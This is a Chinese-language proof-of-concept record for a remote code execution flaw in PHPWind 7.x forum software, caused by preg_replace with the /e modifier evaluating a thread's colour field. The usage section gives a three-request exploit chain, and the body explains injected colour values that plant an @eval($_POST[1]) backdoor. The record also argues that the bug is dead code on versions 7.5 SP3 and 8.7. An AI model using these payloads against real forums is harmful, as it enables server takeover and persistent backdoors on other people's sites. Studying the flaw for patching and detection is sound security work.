# PHPWind 7.x /eis 注入点：copyctrl('$read[colour]') —— 需 pw_threads.colour 列存在

- **code**: phpwind-7.x-eis-注入点-copyctrl-read-colour-需-pw_threads.colour-列存在
- **kind**: poc
- **category**: rce
- **component**: PHPWind 7.x require/template.php + lib/staticpage.class.php
- **severity**: critical
- **language**: php
- **source**: self
- **verified_note**: 7.5 SP3 源码判定 colour 列不存在（建表语句逐列核对 + 全库 grep 无写入点）。7.3.2 待实测：需 1 个 GET 看发帖页是否有颜色选择器。
- **path**: pocs/phpwind-7.x-eis-注入点-copyctrl-read-colour-需-pw_threads.colour-列存在/poc.php
- **tags**: phpwind,preg_replace,/e,复制控制,copyctrl,静态化
- **created_at**: 2026-10-06T11:37:28.998Z

## 描述

require/target191.example.com:345 与 lib/target192.example.com:409 使用 preg_replace 的 /eis 修饰符，替换串为双引号字符串 "copyctrl('$read[colour]')" —— 变量被插值后作为 PHP 代码 eval。colour 来自 SELECT t.* FROM pw_threads，即 pw_threads.colour 列。触发还需版块设置 copyctrl（后台 target193.example.com:459 'copyctrl' 字段）为真。判据：7.5 SP3 的 pw_threads 建表语句（lang/install_wind.sql:3383-3423）无 colour 列，且全代码库只有读 colour、没有写 colour 的位置，故 7.5 上是死代码；8.7 仍保留同一行（8.7 require/target191.example.com:352），官方从未修写法本身。7.3.2 未验证。

## 用法

```
前置：① 某版块 forumset 里 copyctrl=1；② pw_threads.colour 列存在（7.3.2 待确认）。
0 包判定 colour 列是否存在（纯前端观察）：
  GET /bbs/post.php?fid=<可发帖版块>
  查看发帖页面 HTML 里是否有“标题颜色/字体颜色”选择控件（name 含 colour/color 的 select 或 input）。
  有 → 该版本有标题颜色功能，colour 可写，本利用成立。
利用（3 个包）：
  1) POST /bbs/post.php?fid=<fid>&step=2（或 PW 的发表流程）
     subject=test&atc_content=aaa<br>bbb&colour=a') , @eval($_POST[1]), ('b（注意 colour 字段名以实际观测量为准）
  2) 浏览生成的静态页：GET /bbs/read.php?tid=<tid> 或直接 GET /bbs/htm_data/<fid>/<ym>/<tid>.html
     该请求会走 require/template.php 的 htmread 分支 → 静态化 → 触发 /e
  3) 同时 POST 1=<PHP 代码>
  期待回显：phpinfo 内容或命令输出出现在静态页内容中。
```

## 正文

```
// require/target191.example.com:345 （htmread 内，帖子静态页生成路径）
$GLOBALS['foruminfo']['copyctrl'] && $read['content'] = preg_replace("/<br>/eis","copyctrl('$read[colour]')",$read['content']);

// lib/target192.example.com:409 （版块静态页生成路径，同一写法）
$this->forum->foruminfo['copyctrl'] && $read['content'] = preg_replace("/<br>/eis","copyctrl('$read[colour]')",$read['content']);

// 8.7 完全保留：require/target191.example.com:352、lib/target192.example.com:355
// 说明官方 8.7 未修此写法。

// 反证：pw_threads 建表语句（lang/install_wind.sql:3383-3423）逐列核对，无 colour 列：
// tid fid icon titlefont author authorid subject toolinfo toolfield ifcheck type
// postdate lastpost lastposter hits replies favors modelid shares topped topreplays
// locked digest special state ifupload ifmail ifmark ifshield anonymous dig fight
// ptable ifmagic ifhide inspect tpcstatus
// 全代码库 grep 'colour' 仅 3 处命中，全部是“读”，没有任何写入 pw_threads.colour 的代码
// → 7.5 SP3 / 8.7 上 $read['colour'] 恒为空，此 /e 为死代码。
// → 但 7.3.2 属更早版本，若老库 pw_threads 保留 colour 列且前台发帖曾支持“标题颜色”
//   （profile/post 模板里会有颜色选择器），则该 /e 立刻复活。

// 注入原理（若 colour 可控）：
//   colour = '){@eval($_POST[1])}//
//   替换串先被 PHP 双引号插值 → copyctrl('){@eval($_POST[1])}//')
//   再被 /e 当 PHP 代码 eval → 执行 { @eval($_POST[1]) }
// 另一个通用短 payload（不需要引号收尾，因为 colour 一般未做引号过滤）：
//   colour = a') , @eval($_POST[1]), ('b
//   插入后：copyctrl('a') , @eval($_POST[1]), ('b')  → 完整表达式，eval 执行
```
